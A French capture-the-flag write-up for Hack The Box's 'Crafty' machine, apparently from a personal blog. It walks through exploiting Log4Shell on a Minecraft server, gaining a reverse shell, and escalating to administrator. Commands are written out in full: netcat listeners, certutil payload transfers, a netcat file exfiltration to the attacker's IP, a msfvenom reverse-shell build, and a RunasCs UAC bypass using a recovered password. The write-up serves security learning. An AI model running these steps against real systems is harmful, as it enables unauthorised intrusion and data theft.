---
date: 2024-06-12T21:19:39-05:00
# description: ""
image: "/images/HTB-Crafty/Crafty.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Crafty"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Crafty](https://app.hackthebox.com/machines/Crafty)
* Niveau: Facile
* OS: Windows
---

Crafty est un Windows Server 2019 avec Minecraft 1.16.5, cette version est vulnérable à Log4Shell (`CVE-2021-44228`). Sur Github, nous avons accès à une preuve de concept pour exploiter cette vulnérabilité, nous l'utilisons pour obtenir un accès initial au système cible. Pour élever nos privilèges, nous utilisons un mot de passe trouvé dans une archive Java afin d'accéder au compte administrateur.

Addresse IP cible - `10.10.11.249`


## Scanning 

```
sudo nmap -sC -sV -p- -oA nmap/Crafty 10.10.11.249
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:56 CST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.054s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.62 seconds
```

Notre scan révèle deux ports ouverts:

* 80 avec HTTP
* 25565, un serveur minecraft version 1.16.5

Bien qu'il n'y ait pas de redirection, ajoutons `crafty.htb` à notre fichier hosts pour faciliter l'énumération.

```
sudo echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

## Enumération

Lorsque nous nous rendons sur le site web, nous trouvons une page web pour un jeu appelé Crafty.

![Crafty website](/images/HTB-Crafty/crafty-webpage.png)

Nous n'avons aucun moyen d'interagir avec l'application web, nous tournons donc notre attention vers le serveur Minecraft. En recherchant `minecraft 1.16.5 vulnerability`, nous découvrons Log4j avec le [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

> `play.crafty.htb` nous redirige vers `crafty.htb`.

![Minecraft Log4j exploit](/images/HTB-Crafty/log4j-Minecraft.png)

Nous trouvons ensuite une preuve de concept sur ce [repo Github](https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------).

Après inspection du contenu de `poc.py`, nous remarquons qu'il utilise `String cmd="/bin/sh";` ce qui ne fonctionnera pas sous Windows. Afin de le rendre compatible avec Windows, nous changeons cette ligne en `String cmd="cmd.exe";`.

![Log4j PoC content](/images/HTB-Crafty/log4j-poc-content.png)

![Log4j PoC content change](/images/HTB-Crafty/poc-python-change.png)

Sur la page Github, nous lisons: "**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory."

En allant sur le site web indiqué sur la page Github, il nous est demandé de créer un compte. Après quelques recherches, nous trouvons des archives java sur https://repo.huaweicloud.com/java/.

```
#Veillez à télécharger l'archive dans le dossier log4j-shell-poc.
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

tar -xf jdk-8u181-linux-x64.tar.gz

#Renommez le fichier
mv jdk1.8.0_181 jdk1.8.0_20
```

## Accès initial

![Log4j PoC files](/images/HTB-Crafty/log4j-poc-files.png)

Nous avons besoin d'un moyen de communiquer avec le serveur Minecraft, nous utiliserons [pyCraft](https://github.com/ammaraskar/pyCraft). Configurons un environnement virtuel pour pyCraft.

```
virtualenv ENV

source ENV/bin/activate

pip install -r requirements.txt
```

![PyCraft setup](/images/HTB-Crafty/pyCraft-setup.png)

Nous avons également besoin d'un listener netcat

```
rlwrap nc -lvnp 4444
```

Ensuite, nous lançons l'exploit log4j à partir du répertoire `log4j-shell-poc`.

```
python3 poc.py --userip <IP_ADDRESS> --webport 80 --lport <PORT_NUMBER>
```

![Log4j exploit launch](/images/HTB-Crafty/crafty-exploit.png)

Depuis le dossier `PyCraft` nous exécutons `start.py`

```
python3 start.py
```

Après s'être connecté au serveur, nous copions le lien généré par `log4j-shell-poc` (sur la ligne commençant par `[+] Send me:`), nous le collons dans pyCraft puis nous appuyons sur `Enter` pour obtenir une connexion sur le listener.

![PyCraft](/images/HTB-Crafty/PyCraft-connection-link.png)

> Si PyCraft ne parvient pas à se connecter au serveur, réinitialiser la box sur HackTheBox devrait résoudre le problème.

![svc_minecraft shell](/images/HTB-Crafty/shell-minecraft.png)

Nous trouvons `user.txt` sur le bureau de l'utilisateur.

![Crafty user flag](/images/HTB-Crafty/crafty-user-flag.png)

## Elévation de Privilèges

Une archive nommée `playercounter-1.0-SNAPSHOT.jar` est trouvée dans `c:\Users\svc_minecraft\server\plugins\`.

Pour exfiltrer le fichier vers notre machine locale, nous utilisons `nc.exe` (Netcat pour Windows).

1. Téléchargez `nc.exe` avec 

```
wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
```

2. Démarrez un serveur web avec Python dans le répertoire `netcat-1.11`.

```
python3 -m http.server
```

3. Envoyez `nc.exe` sur le système cible

```
certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
```

![netcat upload on target](/images/HTB-Crafty/nc.exe-ontarget.png)

4. Sur notre machine locale, nous exécutons

```
nc -nlp 1235 > playercounter-1.0-SNAPSHOT.jar
```

5. Enfin, nous envoyons l'archive à notre machine Kali 

```
.\nc.exe 10.10.14.222 1235 < c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
```

![Crafty archive exfiltration](/images/HTB-Crafty/archive-exfiltration.png)

> Pour reprendre le contrôle du terminal sur le système cible, arrêtez le listener

Après avoir extrait l'archive, nous obtenons `Playercounter.class` dans `/htb/crafty/playercounter/` que nous décompilons avec [decompiler.com](https://www.decompiler.com/).

> Pour en savoir plus sur les fichiers .class, cliquez [ici](https://www.online-convert.com/fr/format-fichier/class)

Nous trouvons ce qui ressemble à un mot de passe (`s67u84zKq8IXw`) utilisé lors de la connexion à un service sur le port 27015 (typiquement utilisé par les jeux en ligne). 

![archive content credentials](/images/HTB-Crafty/playercount-file.png)

Nous disposons d'un outil appelé [RunasCs](https://github.com/antonioCoco/RunasCs) qui nous permet d'exécuter des processus avec des permissions différentes de celles de notre utilisateur actuel. Notre objectif est d'obtenir l'accès au compte `Administrator` à partir de l'utilisateur actuel `svc_minecraft`.

Créons un payload avec `msfvenom`.

**Example**

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=<YOUR IP ADDRESS> lport=<PORT NUMBER> -f exe -a x64 --platform windows -o shell.exe
```

Les fichiers `shell.exe` et `RunasCs.exe` sont transférés à la cible en utilisant la même méthode que celle employée pour `nc.exe`.

![malicious file and runascs.exe on target](/images/HTB-Crafty/files-on-target.png)

Nous mettons en place un autre listener sur le port sélectionné pour le payload.

```
rlwrap -cAr nc -lvp <PORT_NUMBER>
```

Nous utilisons ensuite `runasCs` en conjonction avec le fichier malveillant.

```
.\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
```

Et finalement nous obtenons une connexion sur le listener, en tant que `administrator`.

![admin shell](/images/HTB-Crafty/admin-shell.png)

Dans `C:\Users\Administrator\Desktop` nous trouvons `root.txt`.

![root flag](/images/HTB-Crafty/root-flag.png)

## Mots de Fin

Log4j est considéré comme l'une des vulnérabilités les plus critiques, car elle permet aux attaquants de facilement prendre le contrôle de systèmes vulnérables. Il est très important d'être capable de reconnaître et de tester les vulnérabilités les plus populaires. Vous trouverez ci-dessous une vidéo et un article détaillant Log4j.

* [Log4J | Log4shell : c'est quoi cette vulnérabilité en deux mots ? | Vulnérabilité Log4J](https://www.youtube.com/watch?v=U6V5ok-O4ec&ab_channel=Techno)
* [Qu’est-ce que la vulnérabilité Apache Log4J (Log4Shell) ?](https://www.trendmicro.com/fr_fr/what-is/apache-log4j-vulnerability.html)
